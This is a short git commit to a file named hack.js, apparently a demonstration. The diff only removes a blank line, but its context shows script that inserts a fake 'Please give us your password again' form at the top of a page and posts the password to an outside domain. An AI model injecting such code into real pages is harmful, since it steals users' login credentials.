6543ef6b704a3078e8bd1f38dfaa55915ba2d579
Brad Westfall <brad@azpixels.com>
2014-07-10 12:07:26 -0700

    hackdanny

--- hack.js
+++ hack.js
@@ -12,4 +12,3 @@ var body = document.querySelector('body');
 var fragment = create('<form action="http://www.azpixels.com">Please give us your password again<br><input name="password" type="password"><button>Submit</button></form>');
 
 body.insertBefore(fragment, body.firstChild);
-
